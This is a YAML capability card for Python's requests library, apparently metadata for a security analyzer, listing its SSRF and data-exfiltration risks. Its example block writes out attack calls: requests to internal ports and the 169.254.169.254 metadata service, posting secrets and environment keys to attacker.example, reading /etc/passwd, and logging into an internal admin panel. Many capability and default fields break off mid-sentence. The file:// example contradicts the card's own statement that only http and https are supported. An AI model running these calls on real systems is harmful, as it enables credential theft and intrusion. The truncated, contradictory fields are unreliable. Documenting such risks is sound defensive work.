# requests.get / requests.post / requests.request

```yaml
schema_version: sink-capability-card/v2
card_id: SCC-ced0eeb5d87bedcd
api: requests.get / requests.post / requests.request
api_family: requests.get-post-request
runtime:
  language: python
  ecosystem: python-runtime
  package: requests
  version: legacy-source-bound
capability_class: network-egress
normative_authority: capability-facts-only
bound_sinks:
- requests.get(url, ...)
- requests.post(url, ...)
- requests.put(url, ...)
- requests.patch(url, ...)
- requests.delete(url, ...)
- requests.head(url, ...)
- requests.request(method, url, ...)
- requests.Session().<verb>(url, ...)
roles:
- role_id: destination-url
  description: Legacy controlled role destination-url.
  bindings:
  - expression: url
    caller_bindable: true
- role_id: headers
  description: Legacy controlled role headers.
  bindings:
  - expression: headers
    caller_bindable: true
- role_id: query-parameters
  description: Legacy controlled role query-parameters.
  bindings:
  - expression: params
    caller_bindable: true
- role_id: request-body
  description: Legacy controlled role request-body.
  bindings:
  - expression: data
    caller_bindable: true
  - expression: json
    caller_bindable: true
facets:
- facet_id: legacy-facet-b233434e
  capability: Issue an HTTP GET request to any attacker-chosen URL and receive the full response
  role_ids:
  - destination-url
  - headers
  - query-parameters
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: headers
      operator: equals
      value: true
    - predicate: role-bound
      subject: query-parameters
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-1e95bc6d
  capability: Issue an HTTP POST (or PUT / PATCH) request with an attacker-controlled body (form
  role_ids:
  - destination-url
  - headers
  - query-parameters
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: headers
      operator: equals
      value: true
    - predicate: role-bound
      subject: query-parameters
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-556766bd
  capability: Issue any arbitrary HTTP method (including custom / non-standard verbs) via
  role_ids:
  - destination-url
  - headers
  - query-parameters
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: headers
      operator: equals
      value: true
    - predicate: role-bound
      subject: query-parameters
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-76f189e5
  capability: Target any port on any routable host — the URL scheme and host component are fully
  role_ids:
  - destination-url
  - headers
  - query-parameters
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: headers
      operator: equals
      value: true
    - predicate: role-bound
      subject: query-parameters
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-4b1f50c2
  capability: 'Reach cloud-instance metadata services on link-local addresses:'
  role_ids:
  - destination-url
  - headers
  - query-parameters
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: headers
      operator: equals
      value: true
    - predicate: role-bound
      subject: query-parameters
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-0121bf69
  capability: Follow HTTP redirects (3xx) automatically by default (`allow_redirects=True`) —
  role_ids:
  - destination-url
  - headers
  - query-parameters
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: headers
      operator: equals
      value: true
    - predicate: role-bound
      subject: query-parameters
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-43f77806
  capability: 'Send attacker-chosen HTTP headers via the `headers` kwarg, including:'
  role_ids:
  - destination-url
  - headers
  - query-parameters
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: headers
      operator: equals
      value: true
    - predicate: role-bound
      subject: query-parameters
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-5c0d6a12
  capability: Exfiltrate data through the query string (`params` kwarg), the request body
  role_ids:
  - destination-url
  - headers
  - query-parameters
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: headers
      operator: equals
      value: true
    - predicate: role-bound
      subject: query-parameters
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-9df64857
  capability: Use a persistent `requests.Session` to maintain cookie jars and connection pools
  role_ids:
  - destination-url
  - headers
  - query-parameters
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: headers
      operator: equals
      value: true
    - predicate: role-bound
      subject: query-parameters
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-de736b6d
  capability: Stream large responses (`stream=True`) without buffering the full body in memory,
  role_ids:
  - destination-url
  - headers
  - query-parameters
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: headers
      operator: equals
      value: true
    - predicate: role-bound
      subject: query-parameters
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-83a84243
  capability: Set a custom `timeout` (or omit it) to control blocking behavior — a request to a
  role_ids:
  - destination-url
  - headers
  - query-parameters
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: headers
      operator: equals
      value: true
    - predicate: role-bound
      subject: query-parameters
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
- facet_id: legacy-facet-621bca85
  capability: Upload local files as the request body via `files=` kwarg, or read from file-like
  role_ids:
  - destination-url
  - headers
  - query-parameters
  - request-body
  activation:
    any_of:
    - predicate: role-bound
      subject: destination-url
      operator: equals
      value: true
    - predicate: role-bound
      subject: headers
      operator: equals
      value: true
    - predicate: role-bound
      subject: query-parameters
      operator: equals
      value: true
    - predicate: role-bound
      subject: request-body
      operator: equals
      value: true
library_guarantees:
- guarantee_id: http-https-adapters-only
  statement: The default Requests session registers adapters only for http:// and https://; other schemes raise InvalidSchema.
  activation:
    all_of:
    - predicate: always
      subject: requests-default-session
      operator: equals
      value: true
defaults:
- default_id: legacy-default-5b3f1081
  role_id: null
  value: '`allow_redirects=True` — HTTP 3xx redirects are followed automatically (up to 30'
  security_effect: '`allow_redirects=True` — HTTP 3xx redirects are followed automatically (up to 30'
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-70b3401b
  role_id: null
  value: Environment-configured proxy is respected — if `HTTP_PROXY`, `HTTPS_PROXY`, or
  security_effect: Environment-configured proxy is respected — if `HTTP_PROXY`, `HTTPS_PROXY`, or
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-6cb4200a
  role_id: null
  value: '`verify=True` by default — TLS certificates are validated against the system trust'
  security_effect: '`verify=True` by default — TLS certificates are validated against the system trust'
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-ce97a921
  role_id: null
  value: The `Session` object persists cookies across requests by default — one request can
  security_effect: The `Session` object persists cookies across requests by default — one request can
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-62f76e03
  role_id: null
  value: Automatic content decompression — responses with Content-Encoding gzip / deflate /
  security_effect: Automatic content decompression — responses with Content-Encoding gzip / deflate /
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-68774e95
  role_id: null
  value: DNS resolution happens at connect time by the underlying socket layer — there is no
  security_effect: DNS resolution happens at connect time by the underlying socket layer — there is no
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
example_usage:
  benign: 'import requests


    # Normal public API call

    resp = requests.get("https://httpbin.org/get", params={"q": "hello"})

    print(resp.status_code, resp.json())

    '
  capability_edge: "import requests\n\n# 1. SSRF — hit internal-only service via localhost\nr = requests.get(\"http://127.0.0.1:6379/\")  # Redis, or any internal port\nprint(r.text[:200])\n\n# 2. Redirect chain into internal host (followed silently)\nr = requests.get(\n    \"http://attacker-controlled.example/redirect?to=http://169.254.169.254/latest/meta-data/\"\n)\nprint(r.text[:500])\n\n# 3. Exfiltrate via query-string params to attacker-controlled listener\nimport os\nsecret = os.environ.get(\"SECRET\", \"test-secret\")\nrequests.get(\"https://attacker.example/log\", params={\"exfil\": secret})\n\n# 4. Exfiltrate via POST body (JSON)\nrequests.post(\n    \"https://attacker.example/collect\",\n    json={\"hostname\": os.uname().nodename, \"env_keys\": list(os.environ.keys())[:10]},\n)\n\n# 5. Non-HTTP scheme — read local files\nr = requests.get(\"file:///etc/passwd\")\nprint(r.text[:500])\n\n# 6. Arbitrary method against internal service\nrequests.request(\"PURGE\", \"http://internal-varnish-cache/admin/purge/all\"\
    )\n\n# 7. Session-based multi-step: login to internal service, then query\ns = requests.Session()\ns.post(\"http://admin-panel.internal/login\", data={\"user\": \"admin\", \"pass\": \"admin\"})\ns.get(\"http://admin-panel.internal/secrets\")\n"
provenance:
- requests documentation v2.32.5 — https://requests.readthedocs.io/en/latest/api/#requests.get
- OWASP Server-Side Request Forgery Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
- 'CWE-918: Server-Side Request Forgery (SSRF) — https://cwe.mitre.org/data/definitions/918.html'
- AWS IMDSv1 metadata endpoint — https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html
- GCP metadata endpoint — https://cloud.google.com/compute/docs/metadata/overview
- urllib3/requests implicit scheme support (file://, ftp://) — requests source, models.py / adapters.py
```
